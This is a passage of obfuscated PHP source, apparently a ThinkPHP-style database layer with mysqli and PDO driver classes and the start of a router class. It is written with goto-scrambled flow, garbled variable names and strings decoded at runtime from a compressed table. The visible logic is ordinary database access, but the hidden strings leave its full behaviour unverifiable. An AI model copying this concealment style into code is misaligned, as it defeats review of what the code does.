$b®Úäë¢[$b•ÖÃï[822]] ? intval($b®Úäë¢[$b•ÖÃï[822]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto a¯†™ñ¶‰…; e»•ÚÉ‚: } return $this->linkID[$fÖùç÷Áµ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($EáˆŸÒ’Åì) { goto A¦¿ù¡¸ô¸; CÙ ƒÀµëÀ: think_status($C°¡…œï’´[20]); $this->queryID = $this->_linkID->query($EáˆŸÒ’Åì); if ($this->_linkID->more_results()) { while (($EÎß‡Úòµ = $this->_linkID->next_result()) != NULL) { $EÎß‡Úòµ->free_result(); } } goto EÉÚÙî£; EÉÚÙî£: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¾Œ×èİ; A¦¿ù¡¸ô¸: $C°¡…œï’´ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dï±’å÷Ş…; Dï±’å÷Ş…: $this->queryStr = $EáˆŸÒ’Åì; if ($this->queryID) { $this->free(); } think_action_status($C°¡…œï’´[19], 1); goto CÙ ƒÀµëÀ; F¾Œ×èİ: } public function execute($EİŞ¦ÇÈ†) { goto BË¡Äªî; fÓ±àëÒ¨²: think_status($Bïó·œ¶¥®[20]); $E“ö˜Ï†—‹ = $this->_linkID->query($EİŞ¦ÇÈ†); $this->debug(); goto cÉçÁÕ¡; c¬ôã»„ìù: $this->queryStr = $EİŞ¦ÇÈ†; if ($this->queryID) { $this->free(); } think_action_status($Bïó·œ¶¥®[21], 1); goto fÓ±àëÒ¨²; cÉçÁÕ¡: if (!1 === $E“ö˜Ï†—‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto bõÚóËîäš; BË¡Äªî: $Bïó·œ¶¥® =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¬ôã»„ìù; bõÚóËîäš: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CË¡Æ´Šµî = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CË¡Æ´Šµî) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¸‡¡‹Áğí = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¸‡¡‹Áğí) { $this->error(); return !1; } } return !0; } private function getAll() { $D•ÜæøÔ¾ = array(); if ($this->numRows > 0) { for ($a™ä§É¯ö« = 0; $a™ä§É¯ö« < $this->numRows; $a™ä§É¯ö«++) { $D•ÜæøÔ¾[$a™ä§É¯ö«] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $D•ÜæøÔ¾; } public function getFields($c™ìíôç¿İ) { $DïÔ¿¸ë =& $_SERVER[Â€Á›¨õ]; $fòÊÇƒŠÁÒ = $this->query($DïÔ¿¸ë[832] . $this->parseKey($c™ìíôç¿İ)); $eŠŠÆ‡ÏŒ = array(); if ($fòÊÇƒŠÁÒ) { foreach ($fòÊÇƒŠÁÒ as $e°Î„µ†Êï => $DÎõÃÉÃ°ë) { $eŠŠÆ‡ÏŒ[$DÎõÃÉÃ°ë[$DïÔ¿¸ë[27]]] = array($DïÔ¿¸ë[28] => $DÎõÃÉÃ°ë[$DïÔ¿¸ë[27]], $DïÔ¿¸ë[29] => $DÎõÃÉÃ°ë[$DïÔ¿¸ë[30]], $DïÔ¿¸ë[31] => (bool) ($DÎõÃÉÃ°ë[$DïÔ¿¸ë[32]] === $DïÔ¿¸ë[33]), $DïÔ¿¸ë[34] => $DÎõÃÉÃ°ë[$DïÔ¿¸ë[35]], $DïÔ¿¸ë[36] => strtolower($DÎõÃÉÃ°ë[$DïÔ¿¸ë[37]]) == $DïÔ¿¸ë[38], $DïÔ¿¸ë[39] => strtolower($DÎõÃÉÃ°ë[$DïÔ¿¸ë[40]]) == $DïÔ¿¸ë[41]); } } return $eŠŠÆ‡ÏŒ; } public function getTables($Eˆ¨ÏÃ¯‰Á = '') { $aÛõçÁˆ·ã =& $_SERVER[Â€Á›¨õ]; $A¡‘›¡® = !empty($Eˆ¨ÏÃ¯‰Á) ? $aÛõçÁˆ·ã[834] . $Eˆ¨ÏÃ¯‰Á . $aÛõçÁˆ·ã[835] : $aÛõçÁˆ·ã[836]; $DñÀ–ÇÎ‰ = $this->query($A¡‘›¡®); $F±¥Şˆ´¬ƒ = array(); if ($DñÀ–ÇÎ‰) { foreach ($DñÀ–ÇÎ‰ as $c„°ÛëƒÛ¦ => $DòÏ§èá„£) { $F±¥Şˆ´¬ƒ[$c„°ÛëƒÛ¦] = current($DòÏ§èá„£); } } return $F±¥Şˆ´¬ƒ; } public function replace($A³Ü§å–¹, $eŠâ¹Æ„„œ = array()) { $A‡‡Ù¸… =& $_SERVER[Â€Á›¨õ]; foreach ($A³Ü§å–¹ as $e¾Õ£ƒ±Ÿã => $a“Í–‡õ) { $B“’÷¹†»­ = $this->parseValue($a“Í–‡õ); if (is_scalar($B“’÷¹†»­)) { $EòÚœ÷Ø[] = $B“’÷¹†»­; $C¸àèàÖ[] = $this->parseKey($e¾Õ£ƒ±Ÿã); } } $f¡–ã½÷À‰ = $A‡‡Ù¸…[837] . $this->parseTable($eŠâ¹Æ„„œ[$A‡‡Ù¸…[275]]) . $A‡‡Ù¸…[838] . implode($A‡‡Ù¸…[47], $C¸àèàÖ) . $A‡‡Ù¸…[839] . implode($A‡‡Ù¸…[47], $EòÚœ÷Ø) . $A‡‡Ù¸…[840]; return $this->execute($f¡–ã½÷À‰); } public function insertAll($f‡ò¡ˆØ, $C—²£…Ñ¸ = array(), $DÂ³¾Âƒš = false) { goto e˜øÇŒ¡É; cŠ»‚…À«: $D†øÉ·šÈ = array(); foreach ($f‡ò¡ˆØ as $A–ñ‘ŸÓ¦ ) { $C£Ş‰Ø‚Œ‘ = array(); foreach ($A–ñ‘ŸÓ¦  as $AÜ•â‰ÖôÍ => $føŒ©—¨¯) { $føŒ©—¨¯ = $this->parseValue($føŒ©—¨¯); if (is_scalar($føŒ©—¨¯)) { $C£Ş‰Ø‚Œ‘[] = $føŒ©—¨¯; } } $D†øÉ·šÈ[] = $aßë³ÆÒ‘¡[256] . implode($aßë³ÆÒ‘¡[47], $C£Ş‰Ø‚Œ‘) . $aßë³ÆÒ‘¡[840]; } array_walk($EáÇª·ƒìï, array($this, $aßë³ÆÒ‘¡[841])); goto dŒèËö›ì; e˜øÇŒ¡É: $aßë³ÆÒ‘¡ =& $_SERVER[Â€Á›¨õ]; if (!is_array($f‡ò¡ˆØ[0])) { return !1; } $EáÇª·ƒìï = array_keys($f‡ò¡ˆØ[0]); goto cŠ»‚…À«; dŒèËö›ì: $c­à¼¶‚É‘ = $DÂ³¾Âƒš ? $aßë³ÆÒ‘¡[842] : $aßë³ÆÒ‘¡[843]; $cË¦ö—Î—› = $c­à¼¶‚É‘ . $aßë³ÆÒ‘¡[844] . $this->parseTable($C—²£…Ñ¸[$aßë³ÆÒ‘¡[275]]) . $aßë³ÆÒ‘¡[838] . implode($aßë³ÆÒ‘¡[47], $EáÇª·ƒìï) . $aßë³ÆÒ‘¡[845] . implode($aßë³ÆÒ‘¡[47], $D†øÉ·šÈ); return $this->execute($cË¦ö—Î—›); goto CÚŞôô İ; CÚŞôô İ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Bİò¸»¢Ò =& $_SERVER[Â€Á›¨õ]; $this->error = $this->_linkID->errno . $Bİò¸»¢Ò[4] . $this->_linkID->error; if ($Bİò¸»¢Ò[33] != $this->queryStr) { $this->error .= LNG($Bİò¸»¢Ò[45]) . $this->queryStr; } think_trace($this->error, $Bİò¸»¢Ò[33], $Bİò¸»¢Ò[46]); return $this->error; } public function escapeString($c¬Äˆ¸î¶Ü) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c¬Äˆ¸î¶Ü); } else { return addslashes($c¬Äˆ¸î¶Ü); } } public function parseKey(&$FÇîöÂĞîÍ, $c±®Ÿğ‹Åñ = true) { $eÕö›Èæñ =& $_SERVER[Â€Á›¨õ]; if ($c±®Ÿğ‹Åñ) { $FÇîöÂĞîÍ = $this->parseKeyCheck($FÇîöÂĞîÍ); } if ($FÇîöÂĞîÍ != $eÕö›Èæñ[182] && !preg_match($eÕö›Èæñ[846], $FÇîöÂĞîÍ)) { $FÇîöÂĞîÍ = $eÕö›Èæñ[380] . trim($FÇîöÂĞîÍ, $eÕö›Èæñ[380]) . $eÕö›Èæñ[380]; } return $FÇîöÂĞîÍ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($BëÙÖæò…° = '') { $d£› …Á°­ =& $_SERVER[Â€Á›¨õ]; if (!class_exists($d£› …Á°­[848])) { think_exception(think_lang($d£› …Á°­[10]) . $d£› …Á°­[849]); } if (!empty($BëÙÖæò…°)) { $this->config = $BëÙÖæò…°; if (empty($this->config[$d£› …Á°­[13]])) { $this->config[$d£› …Á°­[13]] = array(); } } } public function connect($Aå™·êóˆÔ = '', $cêØšĞ–¡ = 0) { $dâ°é×ƒæŸ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->linkID[$cêØšĞ–¡])) { goto f‘Èä…ßÖ; f‘Èä…ßÖ: if (empty($Aå™·êóˆÔ)) { $Aå™·êóˆÔ = $this->config; } $A‰ÓãĞ‚Ï = !empty($Aå™·êóˆÔ[$dâ°é×ƒæŸ[13]][$dâ°é×ƒæŸ[14]]) ? $Aå™·êóˆÔ[$dâ°é×ƒæŸ[13]][$dâ°é×ƒæŸ[14]] : $this->pconnect; if ($A‰ÓãĞ‚Ï) { $Aå™·êóˆÔ[$dâ°é×ƒæŸ[13]][PDO::ATTR_PERSISTENT] = !0; } goto dÓÄêø¤œÈ; dÓÄêø¤œÈ: try { $this->linkID[$cêØšĞ–¡] = new PDO($Aå™·êóˆÔ[$dâ°é×ƒæŸ[850]], $Aå™·êóˆÔ[$dâ°é×ƒæŸ[823]], $Aå™·êóˆÔ[$dâ°é×ƒæŸ[824]], $Aå™·êóˆÔ[$dâ°é×ƒæŸ[13]]); } catch (PDOException $A„Ù‹ô–Ì) { think_exception($A„Ù‹ô–Ì->getMessage()); } $this->dbType = $this->_getDsnType($Aå™·êóˆÔ[$dâ°é×ƒæŸ[850]]); if (in_array($this->dbType, array($dâ°é×ƒæŸ[851], $dâ°é×ƒæŸ[852], $dâ°é×ƒæŸ[853], $dâ°é×ƒæŸ[854]))) { think_exception($dâ°é×ƒæŸ[855] . $this->dbType . $dâ°é×ƒæŸ[856] . $this->dbType . $dâ°é×ƒæŸ[857]); } goto e•¨ğìœã‚; E«Ê¡•‚Œ: if (1 != think_config($dâ°é×ƒæŸ[18])) { unset($this->config); } goto A¾»‡ƒÓ‘«; e•¨ğìœã‚: if (!$this->linkID[$cêØšĞ–¡]) { think_exception($dâ°é×ƒæŸ[858]); } try { $this->linkID[$cêØšĞ–¡]->exec($dâ°é×ƒæŸ[859] . think_config($dâ°é×ƒæŸ[826])); } catch (Exception $A„Ù‹ô–Ì) { } $this->connected = !0; goto E«Ê¡•‚Œ; A¾»‡ƒÓ‘«: } return $this->linkID[$cêØšĞ–¡]; } public function free() { $this->PDOStatement = null; } public function query($fÇõĞªñóâ, $E¸®ìèÌ…Ò = array()) { goto E×¨ˆØÒº; c¼œŞ²ºŒà: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $f®œ´à‹Û¤ = $this->PDOStatement->execute($E¸®ìèÌ…Ò); $this->debug(); goto B‡áÈæîø­; cíø¦ˆ°­õ: think_action_status($d šä¶¸ˆÃ[19], 1); think_status($d šä¶¸ˆÃ[20]); $this->PDOStatement = $this->_linkID->prepare($fÇõĞªñóâ); goto c¼œŞ²ºŒà; Aª„ö‚¾ß : $this->queryStr = $fÇõĞªñóâ; if (!empty($E¸®ìèÌ…Ò)) { $this->queryStr .= $d šä¶¸ˆÃ[860] . print_r($E¸®ìèÌ…Ò, !0) . $d šä¶¸ˆÃ[861]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cíø¦ˆ°­õ; B‡áÈæîø­: if (!1 === $f®œ´à‹Û¤) { $this->error(); return !1; } else { return $this->getAll(); } goto b”Ê×–…«ù; E×¨ˆØÒº: $d šä¶¸ˆÃ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Aª„ö‚¾ß ; b”Ê×–…«ù: } public function execute($câ«‰ƒÕ½, $B¾Ñ¢â¤¥  = array()) { goto aÍÍ‘â«Çù; E¦Ã…Áøâ­: $this->queryStr = $câ«‰ƒÕ½; if (!empty($B¾Ñ¢â¤¥ )) { $this->queryStr .= $bÚçƒäù×‚[860] . print_r($B¾Ñ¢â¤¥ , !0) . $bÚçƒäù×‚[861]; } $a´±°ÆéóÒ = !1; goto F¤«À“º§×; F¤«À“º§×: if ($this->dbType == $bÚçƒäù×‚[854]) { if (preg_match($bÚçƒäù×‚[862], $this->queryStr, $Fù–×²ºŞÍ)) { $this->table = think_config($bÚçƒäù×‚[863]) . str_ireplace(think_config($bÚçƒäù×‚[864]), $bÚçƒäù×‚[373], $Fù–×²ºŞÍ[2]); $a´±°ÆéóÒ = (bool) $this->query($bÚçƒäù×‚[865] . strtoupper($this->table) . $bÚçƒäù×‚[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($bÚçƒäù×‚[21], 1); goto C¿Á“ƒ»Şé; DŠõÔ„§Õ: $fğºˆ‘©Ğô = $this->PDOStatement->execute($B¾Ñ¢â¤¥ ); $this->debug(); if (!1 === $fğºˆ‘©Ğô) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($a´±°ÆéóÒ || preg_match($bÚçƒäù×‚[866], $câ«‰ƒÕ½)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto bÃ›î¢°”; C¿Á“ƒ»Şé: think_status($bÚçƒäù×‚[20]); $this->PDOStatement = $this->_linkID->prepare($câ«‰ƒÕ½); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto DŠõÔ„§Õ; aÍÍ‘â«Çù: $bÚçƒäù×‚ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¦Ã…Áøâ­; bÃ›î¢°”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÙÆ¼ñô… = $this->_linkID->commit(); $this->transTimes = 0; if (!$AÙÆ¼ñô…) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e½Ô„¯ï² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$e½Ô„¯ï²) { $this->error(); return !1; } } return !0; } private function getAll() { $dÛ³îÙé£ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($dÛ³îÙé£); return $dÛ³îÙé£; } public function getFields($dË˜ğ¥©Úš) { goto fÆª³²æáã; E¾•ïñßÃ: return $D†„šïõ‰; goto Cçé“ë¡Ï; fÆª³²æáã: $EŞÊÙ õ×Â =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (think_config($EŞÊÙ õ×Â[867])) { $b÷‚¦­ÇŸ™ = str_replace($EŞÊÙ õ×Â[868], $dË˜ğ¥©Úš, think_config($EŞÊÙ õ×Â[867])); } else { switch ($this->dbType) { case $EŞÊÙ õ×Â[851]: case $EŞÊÙ õ×Â[869]: $b÷‚¦­ÇŸ™ = "\123\105\x4c\x45\x43\124\40\40\40\x63\x6f\x6c\x75\155\156\137\x6e\x61\155\x65\40\x61\x73\x20\x27\116\141\x6d\x65\47\x2c\x20\40\x20\144\x61\x74\x61\x5f\x74\x79\x70\x65\x20\141\x73\x20\x27\124\x79\x70\145\47\54\x20\40\40\x63\157\154\165\155\x6e\137\x64\x65\146\141\165\154\164\40\x61\x73\x20\x27\104\x65\x66\141\165\x6c\x74\47\54\40\40\x20\x69\163\137\156\x75\154\x6c\x61\x62\x6c\145\40\x61\163\x20\47\116\x75\154\x6c\x27\xa\x9\x9\x46\x52\117\x4d\x9\x69\x6e\146\157\x72\x6d\141\164\151\157\156\137\x73\143\x68\145\x6d\141\56\x74\x61\x62\x6c\x65\x73\40\x41\x53\x20\164\xa\11\11\x4a\117\111\116\x9\151\156\146\x6f\x72\155\x61\x74\151\x6f\156\x5f\163\x63\150\145\155\141\56\143\157\154\165\x6d\156\x73\40\101\x53\40\143\xa\x9\x9\117\x4e\40\x20\164\56\x74\141\x62\x6c\145\x5f\143\x61\x74\141\x6c\x6f\x67\x20\75\40\143\x2e\x74\x61\142\154\x65\x5f\143\x61\x74\141\x6c\x6f\x67\xa\x9\11\101\116\104\x20\x74\56\164\x61\x62\x6c\145\x5f\163\143\x68\x65\155\x61\40\75\x20\143\x2e\164\141\142\154\145\x5f\x73\143\x68\x65\x6d\141\12\x9\x9\x41\116\104\40\x74\x2e\x74\x61\142\x6c\x65\137\156\x61\155\x65\40\75\x20\x63\x2e\x74\141\142\154\x65\x5f\156\141\155\145\xa\x9\x9\127\110\105\x52\x45\40\40\40\x74\56\164\141\142\154\145\137\156\x61\155\145\40\75\40\47{$dË˜ğ¥©Úš}\x27"; break; case $EŞÊÙ õ×Â[870]: $b÷‚¦­ÇŸ™ = $EŞÊÙ õ×Â[871] . $dË˜ğ¥©Úš . $EŞÊÙ õ×Â[872]; break; case $EŞÊÙ õ×Â[852]: case $EŞÊÙ õ×Â[854]: $b÷‚¦­ÇŸ™ = $EŞÊÙ õ×Â[873] . $EŞÊÙ õ×Â[874] . $EŞÊÙ õ×Â[875] . strtoupper($dË˜ğ¥©Úš) . $EŞÊÙ õ×Â[876] . strtoupper($dË˜ğ¥©Úš) . $EŞÊÙ õ×Â[877]; break; case $EŞÊÙ õ×Â[878]: $b÷‚¦­ÇŸ™ = $EŞÊÙ õ×Â[879] . $dË˜ğ¥©Úš . $EŞÊÙ õ×Â[880]; break; case $EŞÊÙ õ×Â[853]: break; case $EŞÊÙ õ×Â[881]: default: $b÷‚¦­ÇŸ™ = $EŞÊÙ õ×Â[882] . ($this->dbType == $EŞÊÙ õ×Â[881] ? "\x60{$dË˜ğ¥©Úš}\x60" : $dË˜ğ¥©Úš); } } goto dÆ•çœÈÂâ; dÆ•çœÈÂâ: $CÖõØĞá¤ê = $this->query($b÷‚¦­ÇŸ™); $D†„šïõ‰ = array(); if ($CÖõØĞá¤ê) { foreach ($CÖõØĞá¤ê as $FŞ–Šìí¬ø => $E‡„Œˆ·š) { $E‡„Œˆ·š = array_change_key_case($E‡„Œˆ·š); $E‡„Œˆ·š[$EŞÊÙ õ×Â[28]] = isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[28]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[28]] : $EŞÊÙ õ×Â[373]; $E‡„Œˆ·š[$EŞÊÙ õ×Â[29]] = isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[29]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[29]] : $EŞÊÙ õ×Â[373]; $C©£¨‚˜÷™ = isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[269]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[269]] : $E‡„Œˆ·š[$EŞÊÙ õ×Â[28]]; $D†„šïõ‰[$C©£¨‚˜÷™] = array($EŞÊÙ õ×Â[28] => $C©£¨‚˜÷™, $EŞÊÙ õ×Â[29] => $E‡„Œˆ·š[$EŞÊÙ õ×Â[29]], $EŞÊÙ õ×Â[31] => (bool) (isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[102]]) && $E‡„Œˆ·š[$EŞÊÙ õ×Â[102]] === $EŞÊÙ õ×Â[33] || isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[31]]) && $E‡„Œˆ·š[$EŞÊÙ õ×Â[31]] === $EŞÊÙ õ×Â[33]), $EŞÊÙ õ×Â[34] => isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[34]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[34]] : (isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[53]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[53]] : $EŞÊÙ õ×Â[373]), $EŞÊÙ õ×Â[36] => isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[92]]) ? strtolower($E‡„Œˆ·š[$EŞÊÙ õ×Â[92]]) == $EŞÊÙ õ×Â[38] : (isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[54]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[54]] : !1), $EŞÊÙ õ×Â[39] => isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[883]]) ? strtolower($E‡„Œˆ·š[$EŞÊÙ õ×Â[883]]) == $EŞÊÙ õ×Â[41] : (isset($E‡„Œˆ·š[$EŞÊÙ õ×Â[92]]) ? $E‡„Œˆ·š[$EŞÊÙ õ×Â[92]] : !1)); } } goto E¾•ïñßÃ; Cçé“ë¡Ï: } public function getTables($dšôÙŸ¶¡Ê = '') { $EÚ½»ÈÎ› =& $_SERVER[Â€Á›¨õ]; if (think_config($EÚ½»ÈÎ›[884])) { $D™¼ÔÊ­ÉÄ = str_replace($EÚ½»ÈÎ›[885], $dšôÙŸ¶¡Ê, think_config($EÚ½»ÈÎ›[884])); } else { switch ($this->dbType) { case $EÚ½»ÈÎ›[852]: case $EÚ½»ÈÎ›[854]: $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[886]; break; case $EÚ½»ÈÎ›[851]: case $EÚ½»ÈÎ›[869]: $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[887]; break; case $EÚ½»ÈÎ›[878]: $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[888]; break; case $EÚ½»ÈÎ›[853]: think_exception(think_lang($EÚ½»ÈÎ›[889]) . $EÚ½»ÈÎ›[890]); break; case $EÚ½»ÈÎ›[870]: $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[42] . $EÚ½»ÈÎ›[43] . $EÚ½»ÈÎ›[44]; break; case $EÚ½»ÈÎ›[881]: default: if (!empty($dšôÙŸ¶¡Ê)) { $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[834] . $dšôÙŸ¶¡Ê . $EÚ½»ÈÎ›[835]; } else { $D™¼ÔÊ­ÉÄ = $EÚ½»ÈÎ›[836]; } } } $cÃç«Àğêâ = $this->query($D™¼ÔÊ­ÉÄ); $b–‡ˆÂƒƒ— = array(); foreach ($cÃç«Àğêâ as $dÒ˜µ¶ÏÉ => $BâŒØ½¾Æ) { $b–‡ˆÂƒƒ—[$dÒ˜µ¶ÏÉ] = current($BâŒØ½¾Æ); } return $b–‡ˆÂƒƒ—; } protected function parseLimit($Fâåæê•Èê) { $FÄĞ‹£˜ğ« =& $_SERVER[Â€Á›¨õ]; $b†§ÕÆ•’› = $FÄĞ‹£˜ğ«[33]; if (!empty($Fâåæê•Èê)) { switch ($this->dbType) { case $FÄĞ‹£˜ğ«[878]: case $FÄĞ‹£˜ğ«[870]: $Fâåæê•Èê = explode($FÄĞ‹£˜ğ«[47], $Fâåæê•Èê); if (count($Fâåæê•Èê) > 1) { $b†§ÕÆ•’› .= $FÄĞ‹£˜ğ«[48] . $Fâåæê•Èê[1] . $FÄĞ‹£˜ğ«[49] . $Fâåæê•Èê[0] . $FÄĞ‹£˜ğ«[50]; } else { $b†§ÕÆ•’› .= $FÄĞ‹£˜ğ«[48] . $Fâåæê•Èê[0] . $FÄĞ‹£˜ğ«[50]; } break; case $FÄĞ‹£˜ğ«[851]: case $FÄĞ‹£˜ğ«[869]: break; case $FÄĞ‹£˜ğ«[853]: break; case $FÄĞ‹£˜ğ«[852]: case $FÄĞ‹£˜ğ«[854]: break; case $FÄĞ‹£˜ğ«[881]: default: $b†§ÕÆ•’› .= $FÄĞ‹£˜ğ«[48] . $Fâåæê•Èê . $FÄĞ‹£˜ğ«[50]; } } return $b†§ÕÆ•’›; } public function parseKey(&$dº¡Í²çí’, $bÖïÆƒ„à‰ = true) { $AëÒˆßË¿Ï =& $_SERVER[Â€Á›¨õ]; if ($bÖïÆƒ„à‰) { $dº¡Í²çí’ = $this->parseKeyCheck($dº¡Í²çí’); } if ($this->dbType == $AëÒˆßË¿Ï[881]) { if ($dº¡Í²çí’ != $AëÒˆßË¿Ï[182] && !preg_match($AëÒˆßË¿Ï[846], $dº¡Í²çí’)) { $dº¡Í²çí’ = $AëÒˆßË¿Ï[380] . trim($dº¡Í²çí’, $AëÒˆßË¿Ï[380]) . $AëÒˆßË¿Ï[380]; } return $dº¡Í²çí’; } else { return parent::parseKey($dº¡Í²çí’, $bÖïÆƒ„à‰); } } public function close() { $this->_linkID = null; } public function error() { $c¦‘Æ—¹Üè =& $_SERVER[Â€Á›¨õ]; if ($this->PDOStatement) { $eùê³á“Ó« = $this->PDOStatement->errorInfo(); $this->error = $eùê³á“Ó«[1] . $c¦‘Æ—¹Üè[4] . $eùê³á“Ó«[2]; } else { $this->error = $c¦‘Æ—¹Üè[33]; } if ($c¦‘Æ—¹Üè[33] != $this->queryStr) { $this->error .= LNG($c¦‘Æ—¹Üè[45]) . $this->queryStr; } think_trace($this->error, $c¦‘Æ—¹Üè[33], $c¦‘Æ—¹Üè[46]); return $this->error; } public function escapeString($A‰µ­‘£…¾) { $E¼¹Õ¨»œŞ =& $_SERVER[Â€Á›¨õ]; switch ($this->dbType) { case $E¼¹Õ¨»œŞ[878]: case $E¼¹Õ¨»œŞ[851]: case $E¼¹Õ¨»œŞ[869]: case $E¼¹Õ¨»œŞ[881]: return addslashes($A‰µ­‘£…¾); case $E¼¹Õ¨»œŞ[853]: case $E¼¹Õ¨»œŞ[870]: case $E¼¹Õ¨»œŞ[852]: case $E¼¹Õ¨»œŞ[854]: return str_ireplace($E¼¹Õ¨»œŞ[55], $E¼¹Õ¨»œŞ[56], $A‰µ­‘£…¾); } } protected function parseValue($Aõˆ¶–²É‚) { $d”æ´¡ªñ” =& $_SERVER[Â€Á›¨õ]; if (is_string($Aõˆ¶–²É‚)) { $Aõˆ¶–²É‚ = strpos($Aõˆ¶–²É‚, $d”æ´¡ªñ”[4]) === 0 ? $this->escapeString($Aõˆ¶–²É‚) : $d”æ´¡ªñ”[891] . $this->escapeString($Aõˆ¶–²É‚) . $d”æ´¡ªñ”[891]; } elseif (isset($Aõˆ¶–²É‚[0]) && is_string($Aõˆ¶–²É‚[0]) && strtolower($Aõˆ¶–²É‚[0]) == $d”æ´¡ªñ”[293]) { $Aõˆ¶–²É‚ = $this->escapeString($Aõˆ¶–²É‚[1]); } elseif (is_array($Aõˆ¶–²É‚)) { $Aõˆ¶–²É‚ = array_map(array($this, $d”æ´¡ªñ”[892]), $Aõˆ¶–²É‚); } elseif (is_bool($Aõˆ¶–²É‚)) { $Aõˆ¶–²É‚ = $Aõˆ¶–²É‚ ? $d”æ´¡ªñ”[86] : $d”æ´¡ªñ”[491]; } elseif (is_null($Aõˆ¶–²É‚)) { $Aõˆ¶–²É‚ = $d”æ´¡ªñ”[102]; } return $Aõˆ¶–²É‚; } public function getLastInsertId() { $Cì´êÈ¼¿ =& $_SERVER[Â€Á›¨õ]; switch ($this->dbType) { case $Cì´êÈ¼¿[878]: case $Cì´êÈ¼¿[870]: case $Cì´êÈ¼¿[851]: case $Cì´êÈ¼¿[869]: case $Cì´êÈ¼¿[853]: case $Cì´êÈ¼¿[881]: return $this->_linkID->lastInsertId(); case $Cì´êÈ¼¿[852]: case $Cì´êÈ¼¿[854]: $aÒŸš†Åµá = $this->table; $C³Ï¦†ÜºØ = $this->query("\123\105\114\105\103\x54\40{$aÒŸš†Åµá}\56\x63\x75\x72\x72\166\141\154\40\143\x75\162\162\x76\141\154\x20\106\122\x4f\x4d\40\x64\x75\141\154"); return $C³Ï¦†ÜºØ ? $C³Ï¦†ÜºØ[0][$Cì´êÈ¼¿[893]] : 0; } } } goto E¼ÅÆˆµË¸; aÜ×È‡´É: $B¿Ë°­¬™å = $_SERVER[Â€Á›¨õ][569]; while ($B¿Ë°­¬™å < $_SERVER[Â€Á›¨õ][570]) { if ($B¿Ë°­¬™å >= 0) { break; } $B¿Ë°­¬™å++; } $_SERVER[´Öò¹²] = explode($_SERVER[Â€Á›¨õ][571], gzinflate(substr($_SERVER[Â€Á›¨õ][572], 10, -8))); goto Aï‘°‚Š˜; B•â›°²ùÃ: define($_SERVER[Â€Á›¨õ][235], 2); define($_SERVER[Â€Á›¨õ][236], 3); define($_SERVER[Â€Á›¨õ][237], 1); goto Eù¨‡Òî›Ï; b½İ÷Î…Ğ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\136\57\135\53", "\72\x6e\165\x6d" => "\133\x30\55\71\x5d\x2b", "\x3a\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($cË¢¶ï“ÖÏ, $fŠöè¿‡Èò) { $e›¹¢†Á‰Ú =& $_SERVER[Â€Á›¨õ]; if ($cË¢¶ï“ÖÏ == $e›¹¢†Á‰Ú[1449]) { $dó¥’¤ã³Î = array_map($e›¹¢†Á‰Ú[1450], $fŠöè¿‡Èò[0]); $aÌÚ†Öë±Ş = strpos($fŠöè¿‡Èò[1], 